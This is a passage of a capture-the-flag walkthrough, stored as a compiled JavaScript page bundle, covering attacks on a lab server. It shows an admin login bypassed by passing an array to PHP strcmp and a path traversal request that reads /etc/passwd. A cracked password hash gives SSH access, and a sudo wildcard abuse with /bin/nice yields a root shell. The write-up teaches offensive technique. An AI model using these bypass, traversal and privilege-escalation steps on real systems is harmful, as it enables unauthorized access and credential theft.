punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("365")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3600")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"<p>Bad login/password! </br> Return to the <a href=\\"index.php\\">login page</a> <p>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("exit")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n\n\n  "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("form")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("action")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("index.php?login=1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("method")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("POST"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n                "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("h1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("Login"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("h1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n                "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("label")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("b")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("User:"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("b")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("label")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n                "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("username"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("required")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n                "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("br")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n                "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("label")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("b")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("Password:"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("b")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("label")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n                "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("password"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("password"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("required")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n                "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("br")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n                "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("submit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("id")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v("submit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v("Login"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("form")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("body")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("html")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n\n")])])]),a("p",[t._v("We got the username and password. Lets try to login to admin panel. But it doesn't work.")]),t._v(" "),a("p",[t._v("Lets check the modified date of "),a("code",[t._v("index.php.bak")]),t._v(" in ftp. Its "),a("code",[t._v("Aug 2")]),t._v(" and in "),a("code",[t._v("log_03.txt")]),t._v(" , we can see that the password for admin was changed.")]),t._v(" "),a("p",[t._v("Let's check the login logic for the admin panel")]),t._v(" "),a("div",{staticClass:"language-php extra-class"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("strcmp")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_POST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'username'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"admin"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&&")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("strcmp")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_POST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'password'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$pass")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),a("p",[t._v("It is using strcmp to check for the password.\nAfter goolging abit, we find strcmp returns 3 results.")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("Returns < 0 if str1 is less than str2; > 0 if str1 is greater than str2, and 0 if they are equal\n")])])]),a("p",[t._v("So we have to bypass this comparison and return 0. We can do this by passing array for password.")]),t._v(" "),a("p",[t._v("Let's fire burp and login to admin pannel.")]),t._v(" "),a("p",[t._v("Simply change the http request")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("POST //admin/index.php?login=1 HTTP/1.1\nHost: 192.168.186.101\nContent-Length: 25\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.186.101\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.186.101//admin/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\nusername=admin&password=a\n")])])]),a("p",[t._v("To:")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("POST //admin/index.php?login=1 HTTP/1.1\nHost: 192.168.186.101\nContent-Length: 25\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.186.101\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.186.101//admin/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\nusername=admin&password[]=a\n")])])]),a("p",[t._v("Now we get access to admin panel")]),t._v(" "),a("h2",{attrs:{id:"getting-user"}},[t._v("Getting User")]),t._v(" "),a("p",[t._v("After logging to admin panel and exploring a bit there's "),a("code",[t._v("Logs")]),t._v(" using which we can view the logs.")]),t._v(" "),a("p",[t._v("The request to view log is")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("POST //admin/dashboard.php?page=log HTTP/1.1\nHost: 192.168.186.101\nContent-Length: 15\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.186.101\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.186.101//admin/dashboard.php?page=log\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh\nConnection: close\n\nfile=log_01.txt\n")])])]),a("p",[a("code",[t._v("file=log_01.txt")]),t._v(" , it looks like it is showing file from "),a("code",[t._v("/admin/logs/")]),t._v(".\nLet's try to read something interestring.")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("POST //admin/dashboard.php?page=log HTTP/1.1\nHost: 192.168.186.101\nContent-Length: 33\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.186.101\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.186.101//admin/dashboard.php?page=log\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh\nConnection: close\n\nfile=../../../../../../etc/passwd\n")])])]),a("p",[t._v("And we got the content of "),a("code",[t._v("/etc/passwd")]),t._v(".")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash\n")])])]),a("p",[t._v("This is interesting because it shows password for webadmin.\nSave the username and password and Crack the password for webadmin using "),a("code",[t._v("john")])]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ john /tmp/crack.txt --show\nwebadmin:dragon\n")])])]),a("p",[t._v("Now login to ssh using username and password")]),t._v(" "),a("h2",{attrs:{id:"getting-root"}},[t._v("Getting Root")]),t._v(" "),a("p",[t._v("Run "),a("code",[t._v("sudo -l")]),t._v(" to see which command can you run as sudo.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("webadmin@serv:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" -l\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("sudo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" password "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" webadmin: \nMatching Defaults entries "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" webadmin on serv:\n    env_reset, mail_badpass, "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("secure_path")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("/usr/local/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(":/usr/local/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(":/usr/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(":/usr/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(":/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(":/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(":/snap/bin\n\nUser webadmin may run the following commands on serv:\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("ALL "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" ALL"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" /bin/nice /notes/*\n\n")])])]),a("p",[t._v("We see we can run "),a("code",[t._v("/bin/nice /notes/*")]),t._v(" as sudo.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("webadmin@serv:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("ls")]),t._v(" -la /notes\ntotal "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),t._v("\ndrwxr-xr-x  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v(" root root "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("4096")]),t._v(" Aug  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2020")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(".")]),t._v("\ndrwxr-xr-x "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("21")]),t._v(" root root "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("4096")]),t._v(" Sep "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("28")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2020")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v("\n-rwx------  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" root root   "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("11")]),t._v(" Aug  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2020")]),t._v(" clear.sh\n-rwx------  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" root root    "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),t._v(" Aug  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2020")]),t._v(" id.sh\nwebadmin@serv:~$ \n")])])]),a("p",[t._v("Only root can edit or create files on notes. So we cant create file in /notes and do priv esc.")]),t._v(" "),a("p",[t._v("But note there is "),a("code",[t._v("/notes/*")]),t._v(", so its easy to get root without creating any files simply run.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("webadmin@serv:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" /bin/nice /notes/"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v("/bin/bash\nroot@serv:/home/webadmin"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# ")]),t._v("\n")])])]),a("p",[t._v("And we goot root to the server ðŸ˜ƒ")]),t._v(" "),a("p",[t._v("Hope you learnt something from this writeup.\nHappy Hacking ðŸ˜ƒ")])])}),[],!1,null,null,null);s.default=e.exports}}]);